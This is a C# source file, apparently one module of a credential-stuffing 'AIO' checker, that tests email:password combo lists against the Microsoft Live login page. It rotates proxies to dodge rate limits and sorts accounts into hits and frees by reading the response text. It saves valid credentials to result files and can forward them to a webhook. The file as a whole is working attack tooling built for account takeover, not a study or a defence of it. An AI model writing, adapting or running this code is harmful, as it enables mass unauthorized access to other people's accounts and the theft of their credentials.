using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Azuremod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            req.AddHeader("COOKIE",
                                "MSCC=104.140.14.155-US; uaid=fd1cbab376f144c196df5e9a23b38c46; cltm=nw: 2G-Slow; wlidperf=FR=L&ST=1589791817268; MSPOK=$uuid-f848f7a5-4f3b-4231-adc6-a1c149718e66$uuid-9a62249b-a69e-49c3-9c99-d723a8e568f3$uuid-07a0af7f-2dc6-4bfb-abb8-097ab40240ed$uuid-a6f0d4d6-5bce-449c-96af-3a1d4b7105a8$uuid-dd210cd0-9e62-4b28-b8a8-3580ebc2e571$uuid-f16f2879-7838-419b-ba57-4250c9addf5a$uuid-f3d25d16-bece-47ee-b829-f4b890d3111e");
                            var str = "i13=1&login=" + array[0] + "&loginfmt=" + array[0] +
                                      "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" +
                                      array[1] +
                                      "&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DVh*4QvMI6bRTd4YnaA22707UG83ZOsAKbFkML%21OJZVR%21dJXv0H%21Z7aTtmWTiWWVoRJTKBwmJbhP3VG64I9RmYoDGkNjNq4kZI6RIMLkdEowptHxelObKh3aerc4DgRM8lwI7VlZbQX%21UNrsFdafA%21uRNTxhF3FBk5FQ35fplXbyVxOCPq4UZkgra4%21SAh*POXBL9*W7dplWmbNCNZdIW90%24&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&i2=1&i17=0&i18=&i19=5892";
                            var strResponse = req
                                .Post(
                                    "https://login.live.com/ppsecure/post.srf?response_type=code&client_id=51483342-085c-4d86-bf88-cf50c7252078&scope=openid+profile+email+offline_access&response_mode=form_post&redirect_uri=https://login.microsoftonline.com/common/federation/oauth2&state=rQIIAX2RO2_TUACFc5vUNFElKujAwNCBiTaJ77WvE1vqkHdIcvMOxlkix7WJnfiBfZOQbMDChCoGho5MqGMREmKFqYDUOb8AMSGEEAMDyR9gOcM5n3Skc-6GYQJKdxCHEZfCOM6paBjnoabGRQ7iuJGGBmdgQVBF7N-I7b1CzPhF2c5e_Pr66d3L39EzEB1MzJme0Fz7HNweUeoFUjKpLqe-nrBNzXcD16CbNPkegCsAvgFwvhUIXAryIi8gkYcCn8IpmGjIbatvFTCxC1RZjlllwbJKV1vW5KLZ6PYoyRPYt3q4bpGFggivLDWedFusIrcoQXVzw9dlAmvd0bhvr718Yd4oVUZ1uTevd4v2aut6IzOlI7QR1zeX-s-tqOH69sBzA3oWfgoanu7cO8m5jqNrNLHBdIeamkpN12n6rqf71NSDY4tg3FUfssKUqEKqthDS-fbjB_VJu-R56TaxZs74vix0cJPMc8Ogs5x4sm4b0xn_KIv8Gm0KIy6TR3keVppl0pl7uUG-klFEuxQEF2FmvZTtOpfh_XWfY54c6bZqTo483zXMiX4VAd8ju2xY2tmJ7YVuhQ5CfyLg9fb6l5X68eaz8ZfSm8yTt5__7oYut5NBj7cOJ9mi02ovqlV9xjnlmt9pyJqXc-c9cZRVDufDapElQusYS_CUAacM84MBz6-FPkT_--Qqto9YxMZZGIfpA4gkCCUu1f8H0&estsfed=1&fci=23523755-3a2b-41ca-9315-f81f3f566a95&mkt=de-DE&username=<USER>&contextid=18EFE5D08A7839E1&bk=1579349616&uaid=6b063296488e426db2f4cdc4b592f609&pid=15216",
                                    str, "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("Your account or password is incorrect") ||
                                    strResponse.Contains("If you no longer know your password") ||
                                    strResponse.Contains(
                                        "This Microsoft account does not exist. Please enter a different account") ||
                                    strResponse.Contains("Ihr Konto oder Kennwort ist nicht korrekt") ||
                                    strResponse.Contains("Wenn Sie Ihr Kennwort nicht mehr wissen") ||
                                    strResponse.Contains(
                                        "Dieses Microsoft-Konto ist nicht vorhanden. Geben Sie ein anderes Konto ein"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("JavaScript required to sign in") ||
                                         strResponse.Contains("JavaScript required for registration") ||
                                         strResponse.Contains("JavaScript für die Anmeldung erforderlich")) //hit
                                {
                                    var T1 = Parse(strResponse, "id=\"uaid\" value=\"", "\"");
                                    var T2 = Parse(strResponse, "\"pprid\" value=\"", "\"");
                                    var T3 = Parse(strResponse, "id=\"ipt\" value=\"", "\"");
                                    var cappost = "ipt=" + T3 + "&pprid=" + T2 + "&uaid=" + T1;
                                    var cap = req
                                        .Post(
                                            "https://account.live.com/recover?mkt=EN-US&uiflavor=web&client_id=1E00004417ACAE&id=293577&lmif=80&ru=https://login.live.com/oauth20_authorize.srf%3fuaid%3dfd1cbab376f144c196df5e9a23b38c46%26opid%3d6265C48F0F819D9D%26opidt%3d1589791817",
                                            cappost, "application/x-www-form-urlencoded").ToString();
                                    if (cap.Contains("Help us secure your account") ||
                                        cap.Contains("Helfen Sie uns, Ihr Konto zu sichern"))
                                    {
                                        Program.Frees++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Azure_frees", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintFree("Azure", array[0] + ":" + array[1]);
                                    }
                                    else
                                    {
                                        Program.Hits++;
                                        Program.TotalChecks++;
                                        Export.AsResult("/Azure_hits", array[0] + ":" + array[1]);
                                        if (Program.lorc == "LOG")
                                            Settings.PrintHit("Azure", array[0] + ":" + array[1]);
                                        if (Settings.sendToWebhook)
                                            Settings.sendTowebhook1(array[0] + ":" + array[1], "Azure Hits");
                                    }
                                }
                                else
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                            req.Dispose();
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}